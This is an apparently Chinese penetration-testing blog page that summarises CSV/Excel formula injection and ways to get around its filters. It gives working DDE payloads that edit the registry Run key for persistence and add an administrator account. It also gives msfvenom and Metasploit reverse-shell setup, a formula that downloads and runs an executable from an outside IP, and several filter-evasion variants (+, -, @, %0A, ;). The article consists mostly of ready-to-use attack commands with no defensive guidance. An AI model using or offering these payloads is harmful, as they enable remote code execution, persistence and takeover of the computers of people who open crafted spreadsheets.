@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  
+  <title>
+    csv注入利用和绕过总结 | Leticia‘s Blog 
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+  <meta name="author" content="麻薯">
+
+
+
+  <meta name="keywords" content=",渗透测试">
+<meta name="description" content="csv注入csv注入是一种将包含恶意命令的excel公式插入到可以导出csv或xls等格式的文本中，当在excel中打开csv文件时，文件会转换为excel格式并提供excel公式的执行功能，会造成命令执行问题。
+漏洞原理漏洞原理就是excel的一个特性，当单元格中内容以=-+@等符号开头时，excel将会将其当成一个公式处理。
+所以当我们输入=1+1时，excel会自动将其计算
+那么利用这个办法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="csv注入利用和绕过总结 | Leticia‘s Blog">
+<meta property="og:url" content="http://yoursite.com/2020/07/16/csv注入利用和绕过总结/index.html">
+<meta property="og:site_name" content="Leticia‘s Blog">
+<meta property="og:description" content="csv注入csv注入是一种将包含恶意命令的excel公式插入到可以导出csv或xls等格式的文本中，当在excel中打开csv文件时，文件会转换为excel格式并提供excel公式的执行功能，会造成命令执行问题。
+漏洞原理漏洞原理就是excel的一个特性，当单元格中内容以=-+@等符号开头时，excel将会将其当成一个公式处理。
+所以当我们输入=1+1时，excel会自动将其计算
+那么利用这个办法">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/csv_inject/csv01.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/csv_inject/csv02.png">
+<meta property="og:updated_time" content="2020-07-16T13:40:43.104Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="csv注入利用和绕过总结 | Leticia‘s Blog">
+<meta name="twitter:description" content="csv注入csv注入是一种将包含恶意命令的excel公式插入到可以导出csv或xls等格式的文本中，当在excel中打开csv文件时，文件会转换为excel格式并提供excel公式的执行功能，会造成命令执行问题。
+漏洞原理漏洞原理就是excel的一个特性，当单元格中内容以=-+@等符号开头时，excel将会将其当成一个公式处理。
+所以当我们输入=1+1时，excel会自动将其计算
+那么利用这个办法">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/csv_inject/csv01.png">
+
+  <!-- favicon icon files -->
+
+  <link rel="icon" type="image/x-icon" href="/images/favicon.ico">
+  <link rel="icon" href="/images/favicon.ico">
+
+  <!-- css files -->
+  <link rel="stylesheet" href="/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/css/uno.css">
+  <link rel="stylesheet" href="/css/tagscloud.css">
+  <link rel="stylesheet" href="/css/links.css">
+  <link rel="stylesheet" href="/css/archive.css">
+  <link rel="stylesheet" href="/css/jquery.fancybox.css">
+  <link href="//cdn.bootcss.com/highlight.js/9.8.0/styles/monokai-sublime.min.css" rel="stylesheet">
+  <script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+</head>
+<body>
+  <!-- mobile menu -->
+  <span class="mobile btn-mobile-menu">
+    <i class="fa btn-mobile-menu__icon fa-bars" aria-hidden="true"></i>
+  </span>
+  <!-- side panel -->
+  
+  <header class="panel-cover panel-cover--collapsed">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+      
+        <a href="/" title="link to homepage for Leticia‘s Blog"><img src="/images/avatar.jpg" width="80" alt="Leticia‘s Blog logo" class="panel-cover__logo logo" /></a>
+      
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">麻薯</a></h1>
+        <hr class="panel-cover__divider" />
+        
+        <p class="panel-cover__description">
+          She will never see the day it blossoms,maybe.
+        </p>
+        <hr class="panel-cover__divider" />
+        
+        <!-- TagsCloud -->
+        
+
+  <div id="tagscloud">
+<a href="/tags/渗透测试/" class="tagc1">渗透测试 : 43</a><a href="/tags/笔记/" class="tagc2">笔记 : 14</a><a href="/tags/python/" class="tagc3">python : 14</a><a href="/tags/机器学习/" class="tagc4">机器学习 : 13</a><a href="/tags/php/" class="tagc5">php : 10</a><a href="/tags/mysql/" class="tagc1">mysql : 7</a><a href="/tags/sql注入/" class="tagc2">sql注入 : 5</a><a href="/tags/网络安全/" class="tagc3">网络安全 : 5</a><a href="/tags/rop/" class="tagc4">rop : 4</a><a href="/tags/暴力破解/" class="tagc5">暴力破解 : 4</a><a href="/tags/ctf/" class="tagc1">ctf : 3</a><a href="/tags/工具配置/" class="tagc2">工具配置 : 3</a><a href="/tags/文件上传/" class="tagc3">文件上传 : 3</a><a href="/tags/XSS/" class="tagc4">XSS : 2</a><a href="/tags/shell/" class="tagc5">shell : 2</a><a href="/tags/linux/" class="tagc1">linux : 2</a><a href="/tags/内网渗透/" class="tagc2">内网渗透 : 2</a><a href="/tags/密码学/" class="tagc3">密码学 : 2</a><a href="/tags/硬件安全/" class="tagc4">硬件安全 : 2</a><a href="/tags/数据库/" class="tagc5">数据库 : 2</a>
+</div>
+
+        <div class="navigation-wrapper">
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+            
+              
+              <li class="navigation__item"><a href="/#blog" title="" class="blog-button">博客</a></li>
+            
+              
+              <li class="navigation__item"><a href="/archive/" title="" class="">归档</a></li>
+            
+              
+              <li class="navigation__item"><a href="/links/" title="" class="">友链</a></li>
+            
+            </ul>
+          </nav>
+          
+<hr class="panel-cover__divider">
+<nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+    
+      <!-- Github -->
+      <li class="navigation__item">
+        <a href="https://github.com/echohun" title="麻薯's GitHub">
+          <i class='fa fa-github'></i>
+          <span class="label">GitHub</span>
+        </a>
+      </li>
+    
+    
+    
+  </ul>
+</nav>
+
+        </div>
+      </div>
+    </div>
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+  <div class="content-wrapper">
+    <div class="content-wrapper__inner entry">
+      <!-- body panel -->
+      
+<article class="post-container post-container--single">
+  <header class="post-header">
+    <h1 class="post-title">csv注入利用和绕过总结</h1>
+    
+    <div class="post-meta">
+      <time datetime="2020-07-16 21:40:03" class="post-meta__date date">2020-07-16 21:40:03</time> 
+      <span class="post-meta__tags tags">
+      
+        <font class="categories">&#8226; 分类:
+        <a class="categories-link" href="/categories/渗透测试/">渗透测试</a>
+        </font>
+      
+      
+        &#8226; 标签:
+        <font class="tags">
+        <a class="tags-link" href="/tags/渗透测试/">渗透测试</a>
+        </font>
+      
+      </span>
+    </div>
+    
+  </header>
+  <section id="post-content" class="article-content post">
+  <h2 id="csv注入"><a href="#csv注入" class="headerlink" title="csv注入"></a>csv注入</h2><p>csv注入是一种将包含恶意命令的excel公式插入到可以导出csv或xls等格式的文本中，当在excel中打开csv文件时，文件会转换为excel格式并提供excel公式的执行功能，会造成命令执行问题。</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞原理就是excel的一个特性，当单元格中内容以=-+@等符号开头时，excel将会将其当成一个公式处理。</p>
+<p>所以当我们输入=1+1时，excel会自动将其计算</p>
+<p>那么利用这个办法，把等号后面的内容改为执行cmd命令控制其打开一个计算器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">=1+cmd|&apos; /C calc&apos;!A0</div></pre></td></tr></table></figure></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="修改注册表"><a href="#修改注册表" class="headerlink" title="修改注册表"></a>修改注册表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">=cmd|&apos;/C reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v calc /t REG_SZ /d c:\windows\system32\calc.exe /f&apos;!A0</div></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/csv_inject/csv01.png" alt=""></p>
+<h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">=cmd|&apos;/C net user test 123456 /add&apos;!A0+</div></pre></td></tr></table></figure>
+<p>可以使用命令注入中的知识，同时执行两个命令，达到新建一个管理员用户的效果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">=cmd|&apos;/C net user test 123456 /add &amp;&amp; net localgroup administrators test /add&apos;!A0</div></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/csv_inject/csv02.png" alt=""></p>
+<h3 id="下载木马，反弹shell"><a href="#下载木马，反弹shell" class="headerlink" title="下载木马，反弹shell"></a>下载木马，反弹shell</h3><p>准备木马<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#msf生成payload</div><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=4444 -f exe -o reverse_tcp.exe</div><div class="line">#python2开启http服务</div><div class="line">python -m SimpleHTTPServer 8888</div><div class="line">#python3开启http服务</div><div class="line">python -m http.server 8888</div></pre></td></tr></table></figure></p>
+<p>攻击机监听<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">msfconsole</div><div class="line">use exploit/multi/handler</div><div class="line">set PAYLOAD windows/meterpreter/reverse_tcp</div><div class="line">set LHOST xxx.xxx.xxx.xxx</div><div class="line">set LPORT 4444</div><div class="line">run</div></pre></td></tr></table></figure></p>
+<p>靶机从python http服务下载木马并执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl http://170.170.64.17:8888/reverse_tcp.exe --output windowsLocal.exe &amp;&amp; .\windowsLocal.exe</div></pre></td></tr></table></figure></p>
+<p>那么我们在csv注入场景下的payload就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">=cmd|&apos;/C curl http://170.170.64.17:8888/reverse_tcp.exe --output windowsLocal.exe &amp;&amp; .\windowsLocal.exe&apos;!A0</div></pre></td></tr></table></figure></p>
+<p>不过这个方法一般会在下载步骤被windows防火墙拦截，可以自行增加一层编解码或者加解密过程。</p>
+<p>反弹shell也可以通过调用powershell下载powercat反弹，使用nc监听。</p>
+<h2 id="漏洞绕过"><a href="#漏洞绕过" class="headerlink" title="漏洞绕过"></a>漏洞绕过</h2><h3 id="其他运算符号绕过"><a href="#其他运算符号绕过" class="headerlink" title="其他运算符号绕过"></a>其他运算符号绕过</h3><p>很多场景下服务器会过滤=，但是在excel中，+，-，@等也可以触发公式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-cmd|&apos; /C calc&apos;!A0</div><div class="line">+cmd|&apos; /C calc&apos;!A0</div><div class="line">@SUM(cmd|&apos;/c calc&apos;!A0)</div></pre></td></tr></table></figure></p>
+<h3 id="0A绕过自动添加单引号"><a href="#0A绕过自动添加单引号" class="headerlink" title="%0A绕过自动添加单引号"></a>%0A绕过自动添加单引号</h3><p>有些防御手法会在等号之类的运算符前增加’，或每个元素开头直接添加单引号，可使用%0A换行执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%0A-1+cmd|&apos; /C calc&apos;!A0</div></pre></td></tr></table></figure></p>
+<h3 id="绕过自动添加单引号"><a href="#绕过自动添加单引号" class="headerlink" title=";绕过自动添加单引号"></a>;绕过自动添加单引号</h3><p>有些防御手法会在等号之类的运算符前增加’，或每个元素开头直接添加单引号，可使用;分割，分别执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;-1+cmd|&apos; /C calc&apos;!A0</div></pre></td></tr></table></figure></p>
+
+  </section>
+  <div class="copyright">
+    <span>文本标题:</span><a href="/2020/07/16/csv注入利用和绕过总结/" target="_blank">csv注入利用和绕过总结</a><br />
+    <span>文章作者:</span><a href="/" title="回到主页" target="_blank">麻薯</a><br />
+    <span>发布时间:</span>2020-07-16 21:40:03<br />
+    <span>最后更新:</span>2020-07-16 21:40:43<br />
+    <span>原始链接:</span><a href="http://www.uuzdaisuki.com">www.uuzdaisuki.com</a><br />
+    <span>转载声明:</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。
+  </div>
+</article>
+      <!-- footer panel -->
+      <footer class="footer">
+	<center>
+    <span class="footer__copyright">&copy; 2016-2017. | ❤ <a href="mailto:virink@outlook.com"> Virink </a> | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/virink/vhuno">vHuno</a></span>
+    <span>本站采用<i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"知识共享 署名-非商业性使用-禁止演绎 4.0 国际 许可协议"</a></span>
+    </center>
+</footer>
+    </div>
+  </div>
+  <!-- js files -->
+  <script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/js/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/js/main.js"></script>
+  <script src="/js/scale.fix.js"></script>
+  <script src="/js/tagcloud.js"></script>
+  
+  
+	<script src="/js/jquery.fancybox.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			$(".fancybox").fancybox({
+	            padding: 0,
+	            helpers: {
+	                overlay: {
+	                  locked: false
+	                }
+	            }
+	        });
+		});
+	</script>
+
+  
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+    MathJax.Hub.Config({ 
+        tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+    });
+});
+    </script>
+
+  <script src="//cdn.bootcss.com/highlight.js/9.8.0/highlight.min.js"></script>
+  <script src="/js/gallery.js"></script>
+  <script>
+  $(document).ready(function(){
+    hljs.initHighlightingOnLoad();
+  });
+  </script>
+  
+  
+<div id="totop" style="position: fixed; bottom: 50px; right: 30px; cursor: pointer; opacity: 1;">
+	<a title="back to top"><img style="width:30px;height:30px;" src="/images/totop.png"></a>
+</div>
+<script>
+    (function($) {
+        var upperLimit = 100;
+        var scrollElem = $('#totop');
+        var scrollSpeed = 500;
+        scrollElem.hide();
+        $(window).scroll(function() {
+            var scrollTop = $(document).scrollTop();
+            if (scrollTop > upperLimit) {
+                $(scrollElem).stop().fadeTo(300, 1); // fade back in
+            } else {
+                $(scrollElem).stop().fadeTo(300, 0); // fade out
+            }
+        });
+        $(scrollElem).click(function() {
+            $('html, body').animate({
+                scrollTop: 0
+            }, scrollSpeed);
+            return false;
+        });
+    })(jQuery);
+    </script>
+
+
+  <!-- Analytics Google -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-83885261-1', 'auto');
+  ga('send', 'pageview');
+</script>
+  
+    <script src="/js/jquery.githubRepoWidget.min.js"></script>
+
+  <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+</body>
+</html>
